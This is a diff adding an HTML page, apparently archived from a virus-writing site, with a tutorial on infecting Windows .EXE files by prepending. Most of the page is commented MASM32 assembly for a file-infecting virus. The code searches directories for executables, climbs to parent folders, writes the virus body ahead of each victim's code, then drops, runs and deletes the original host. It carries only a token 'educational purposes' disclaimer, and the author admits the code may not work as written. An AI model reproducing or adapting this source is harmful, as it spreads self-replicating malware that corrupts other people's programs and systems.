@@ -1,0 +1,335 @@
+<html><head><script type="text/javascript">
+//<![CDATA[
+try{if (!window.CloudFlare) {var CloudFlare=[{verbose:0,p:0,byc:0,owlid:"cf",bag2:1,mirage2:0,oracle:0,paths:{cloudflare:"/cdn-cgi/nexp/dok3v=1613a3a185/"},atok:"047a5bcbf67431883fc9ed25fba33612",petok:"aa90a036a5220ba036bf011fced3f2fd9dfbbb20-1498755090-1800",zone:"vxheaven.org",rocket:"a",apps:{}}];document.write('<script type="text/javascript" src="//ajax.cloudflare.com/cdn-cgi/nexp/dok3v=85b614c0f6/cloudflare.min.js"><'+'\/script>');}}catch(e){};
+//]]>
+</script>
+</head><body><address style="line-height: 150%;">&nbsp;&nbsp; <b><font size="4">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+<span style="font-style: normal;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Infecting .EXE
+by prepending </span></font></b> </address>
+<address style="line-height: 150%;">
+<span style="font-style: normal;"><font size="4"><b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+---</b></font><b><font size="4">simple method----</font></b></span></address>
+<address style="line-height: 150%;">
+<font size="4"><b><span style="font-style: normal;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+berniee/fakedminded</span></b></font></address>
+<p style="line-height: 150%;"><b>.Introduction:</b> Prepending method of infection to
+some extent considered lame,but yet still<br>
+it does its work.I will explain in this peace of shit this kinda method,and <br>
+from the beginning sorry for my english because it sux!btw the following is for
+educational purposes only if you commit blah,blah....etc<br>
+<br>
+<b>.Prepending How to?<br>
+</b>prepending Infection by definition is adding your virus body which is the <br>
+compiled/assembled .exe to the begining of the victim excutable file<br>
+and the old victime one will be on the end .So it simply doesnt mess up<br>
+with excutable headers.<br>
+<br>
+<b>.Getting started<br>
+</b>to build a prepender virii,you dont have to learn assembly,you can do it
+with any
+other<br>
+programming languages,but with assembly you can do alot of stuff if you
+know<br>
+what you are doing.So,<br>
+lets put some steps inorder&nbsp; to code the virus:<br>
+-you must find a victim file<br>
+-map your own virus (from current running process),and open the victims file
+that we have found on search<br>
+-put the virus in the beginning and the v. to the end<br>
+-drop and execute the old v. if found (not in first generation)<br>
+-wait for dropped file to end so as to delete it.<br>
+<br>
+<b>.Getting deeper&nbsp; </b> </p>
+<p>see the following commented kode:</p>
+<p><b>;------------------cut from here</b></p>
+<p>.586<br>
+.model flat,stdcall<br>
+option casemap:none<br>
+<br>
+include \masm32\include\windows.inc<br>
+include \masm32\include\kernel32.inc<br>
+include \masm32\include\user32.inc<br>
+<br>
+includelib \masm32\lib\kernel32.lib<br>
+includelib \masm32\lib\user32.lib<br>
+<br>
+<b>;------------------------the above was just includes and libraries you
+need in assembling the following<br>
+</b>
+<br>
+vir_size = 4096&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>;any modification please replace thiZ Value (try using merging )<br>
+</b>
+<br>
+<br>
+.data&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>;----needed data<br>
+</b>
+<br>
+mark db "das ist zu kalt!",0&nbsp; <br>
+ext db "*.exe",0<br>
+up_one db "..",0<br>
+<br>
+<br>
+.data?<br>
+wf32 WIN32_FIND_DATA&lt;?&gt;<br>
+fhandle dd ?<br>
+buffer db 512 dup (?)<br>
+buffer_directory1 db 256 dup (?)<br>
+buffer_directory2 db 256 dup (?)<br>
+buffer_inf db 512 dup (?)<br>
+delta_handle dd ?<br>
+<br>
+<br>
+.code<br>
+<br>
+<b>;----beginning of needed procedures
+<br>
+<br>
+;----well, about infecting procedure;it is simple<br>
+;----I avoided infecting win directory files<br>
+;----In this infecting method we just need to allocate a memory<br>
+;----with size =v_size+vir_size;and we put virus body first<br>
+;----then we put victim body next<br>
+;----we started to open our virus file and copy its junk to the memory then we
+close file <br>
+;----then we open the victim file for writing ;but we first read it to memory<br>
+;----next we write our virus first (with size=vir_size);then we put victim data
+at the end<br>
+<br>
+<br>
+<br>
+;///////////////////////infect procedure<br>
+&nbsp;</b></p>
+<p>infect proc<br>
+mov eax,offset wf32.cFileName<br>
+add eax,3<br>
+cmp word ptr [eax],"NIW"<br>
+je exit_inf<br>
+cmp word ptr [eax],"niw"<br>
+je exit_inf<br>
+invoke GetModuleFileName,0,offset buffer_inf,256<br>
+<br>
+invoke CreateFile,offset buffer_inf,80000000h,0,0,3,0,0<br>
+or eax,eax<br>
+jz exit_inf .data?<br>
+<br>
+cfile_handle dd ?<br>
+cfile_size dd ?<br>
+cmemory dd ?<br>
+bwr dd ?<br>
+<br>
+<br>
+.code<br>
+mov cfile_handle,eax<br>
+invoke GetFileSize,cfile_handle,0<br>
+cmp eax,0<br>
+je exit_inf<br>
+mov cfile_size,eax<br>
+invoke GlobalAlloc,0,eax<br>
+mov cmemory,eax<br>
+cmp eax,0<br>
+je exit_inf<br>
+invoke ReadFile,cfile_handle,cmemory,cfile_size,offset bwr,0<br>
+cmp eax,0<br>
+je exit_inf<br>
+<br>
+invoke CloseHandle,cfile_handle<br>
+mov edx,cmemory<br>
+cmp word ptr [edx+vir_size],'ZM'<br>
+je exit_inf<br>
+<br>
+invoke SetFileAttributes,FILE_ATTRIBUTE_ARCHIVE<br>
+<br>
+<br>
+invoke CreateFile,offset wf32.cFileName,40000000h or 80000000h,0,0,3,0,0<br>
+or eax,eax<br>
+jz exit_inf <br>
+.data?<br>
+inf_fHandle dd ?<br>
+inf_fSize dd ?<br>
+inf_mem dd ?<br>
+<br>
+<br>
+.code<br>
+mov inf_fHandle ,eax<br>
+<br>
+invoke GetFileSize,inf_fHandle,0<br>
+or eax,eax<br>
+jz exit_inf<br>
+<br>
+mov inf_fSize,eax<br>
+<br>
+invoke GlobalAlloc,0,inf_fSize<br>
+or eax,eax<br>
+jz exit_inf<br>
+mov inf_mem,eax<br>
+<br>
+invoke ReadFile,inf_fHandle,inf_mem,inf_fSize,offset bwr,0<br>
+or eax,eax<br>
+jz exit_inf<br>
+<br>
+invoke SetFilePointer,inf_fHandle,FILE_BEGIN,0,0<br>
+invoke WriteFile,inf_fHandle,cmemory,vir_size,offset bwr,0<br>
+invoke WriteFile,inf_fHandle,inf_mem,inf_fSize,offset bwr,0<br>
+invoke WriteFile,inf_fHandle,offset mark,sizeof mark,offset bwr,0<br>
+<br>
+invoke CloseHandle,inf_fHandle<br>
+<br>
+<br>
+exit_inf :<br>
+ret<br>
+infect endp<br>
+<b>;//////////////////////end of infect procedure<br>
+</b>
+<br>
+<br>
+<b>;----drop old funcion which have been called when we have been checking<br>
+;----if there is an old victim in our virus ass<br>
+;----it works by making same file name in temp direcetory which was 'c:\' :/<br>
+;----we get pointer to our old victim and just write to our temp filename<br>
+;----we create old victim in new process<br>
+;----then problem is that we had to delete the old_victim after it completes<br>
+;----its running...well I used WaitForSingleObject api that it checks<br>
+;----if the object(our process) still running and returns when it has finished<br>
+;----we set the time of this api to -1(infinite)<br>
+;----then we call del_tracks procedure which will start a loop<br>
+;----trying to delete the temp file(old victim)<br>
+</b>
+<br>
+<b>;////////////////drop old victim procedure<br>
+&nbsp;</b></p>
+<p>drop_old proc<br>
+invoke GetModuleFileName,0,offset buffer_inf,256<br>
+<br>
+.data<br>
+tempdir db "c:\",0<br>
+<br>
+.data?<br>
+stinfo STARTUPINFOA&lt;?&gt;<br>
+prinfo PROCESS_INFORMATION &lt;?&gt;<br>
+.code<br>
+<br>
+mov esi,offset buffer_inf<br>
+add esi,256<br>
+<br>
+loop_slash:<br>
+dec esi<br>
+cmp byte ptr [esi],'\'<br>
+jne loop_slash<br>
+inc esi<br>
+invoke SetCurrentDirectory,offset tempdir<br>
+invoke CreateFile,esi,40000000h,0,0,2,2h,0<br>
+mov delta_handle,eax<br>
+mov eax,cmemory<br>
+add eax,vir_size<br>
+sub cfile_size,vir_size<br>
+invoke WriteFile,delta_handle,eax,cfile_size,offset bwr,0<br>
+invoke CloseHandle,delta_handle<br>
+<br>
+invoke GetStartupInfo,offset stinfo<br>
+invoke CreateProcess,esi,0,0,0,0,CREATE_NEW_CONSOLE,0,0,offset stinfo,offset
+prinfo<br>
+<br>
+invoke WaitForSingleObject,prinfo.hThread,-1<br>
+<br>
+call del_tracks<br>
+<br>
+<br>
+invoke MessageBox,0,esi,esi,0<br>
+ret<br>
+drop_old endp<br>
+<b>;//////////////////end of drop old victim procedure<br>
+</b>
+<br>
+<br>
+<b>;----the following procedure is the delete tracks which will delete the
+temporary formed victim file</b><br>
+<b>;///////////////////delete track procedure</b></p>
+<p><b><br>
+</b>del_tracks proc<br>
+<br>
+loop_7:<br>
+<br>
+invoke DeleteFile,esi<br>
+cmp eax,0<br>
+je loop_7<br>
+ret<br>
+del_tracks endp<br>
+<b>;//////////////////end of delete tracks procedure<br>
+</b>
+<br>
+&nbsp;</p>
+<p>
+<b>;////////////start of our program<br>
+</b>start:<br>
+<br>
+<br>
+<b>;---from here you can see that I started searching for victim files<br>
+;---I used FindFirstFile and FindNextFile apis<br>
+;---and each file found I call for file infection routine<br>
+</b>
+<br>
+infectious:<br>
+invoke FindFirstFile,offset ext,offset wf32<br>
+mov fhandle,eax<br>
+call infect<br>
+<br>
+<br>
+loop_1: ;beginning search files l00p<br>
+invoke RtlZeroMemory ,offset buffer,512<br>
+invoke lstrcpy,offset buffer,offset wf32.cFileName<br>
+invoke FindNextFile,fhandle,offset wf32<br>
+invoke lstrcmp,offset buffer,offset wf32.cFileName<br>
+cmp eax,0<br>
+je exit_loop_1<br>
+call infect<br>
+jmp loop_1<br>
+exit_loop_1:<b> ;exit the searching loop </b></p>
+<p> <br>
+<b>;-----here you may notice that I set the current directory to '..'<br>
+;-----which means getting up one directory<br>
+;-----and inorder not put the cycle infinite <br>
+;-----we put buffer_directory_1(and 2) ro compare<br>
+;-----if our virus cannt go up anyfurhter so as he can exit<br>
+</b>
+<br>
+invoke GetCurrentDirectory,256,offset buffer_directory1<br>
+invoke SetCurrentDirectory,offset up_one<br>
+invoke GetCurrentDirectory,256,offset buffer_directory2<br>
+invoke lstrcmp,offset buffer_directory1,offset buffer_directory2<br>
+cmp eax,0<br>
+je exit_up<br>
+invoke CloseHandle,fhandle<br>
+jmp infectious<br>
+<br>
+exit_up:<br>
+<br>
+<b>;------now we will check if we are carrying old victim<br>
+;------that needs to be extraces and excuted <br>
+;------if not just exit if yes we call for the dropper<br>
+</b>
+<br>
+mov edx,cmemory ;just cheking for old_attached_victim<br>
+cmp word ptr [edx+vir_size],'ZM'<br>
+je call_dropper<br>
+jmp a_5<br>
+call_dropper:<br>
+call drop_old<br>
+a_5:<br>
+<br>
+exit_me:<br>
+invoke ExitProcess,0 <b>;end of the LamE storiE</b><br>
+<br>
+end start<br>
+&nbsp;</p>
+<p>
+<br>
+&nbsp;</p>
+<p>;---- end of cut</p>
+<p>&nbsp;</p>
+<p><b><font face="Arial Narrow" size="5">NOTE: I will not guarantee that the above
+code will work properly since I added/deleted some</font></b></p>
+<p><b><font face="Arial Narrow" size="5">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; lines
+while writing this&nbsp; shit..so I will be pleased if you dont commit copy
+pasting</font></b></p>
+<p><b><font face="Arial Narrow" size="5">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; to run
+virii...just understand the thing and continue your life.</font></b></p></body></html>
